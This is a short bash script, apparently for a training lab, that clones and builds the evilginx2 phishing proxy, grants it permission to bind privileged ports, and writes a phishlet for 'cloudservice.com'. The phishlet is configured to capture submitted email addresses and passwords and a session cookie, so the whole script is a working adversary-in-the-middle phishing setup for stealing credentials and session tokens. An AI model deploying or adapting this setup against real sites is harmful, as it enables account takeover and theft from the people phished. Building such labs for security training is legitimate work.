#!/usr/bin/env bash

set -e

cd ~/BnB/evilginx
git clone https://github.com/kgretzky/evilginx2.git

cd evilginx2
make

sudo setcap 'cap_net_bind_service=+ep' "$(realpath ./build/evilginx)"

getcap "$(realpath ./build/evilginx)"

cat > ./phishlets/cloudservice.yaml <<'EOF'
min_ver: '3.0.0'

proxy_hosts:
  - {
      phish_sub: 'official',
      orig_sub: '',
      domain: 'cloudservice.com',
      session: true,
      is_landing: true,
      auto_filter: true
    }

auth_tokens:
  - domain: 'cloudservice.com'
    keys: ['training_session']
    type: 'cookie'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/dashboard'

login:
  domain: 'cloudservice.com'
  path: '/login'
EOF
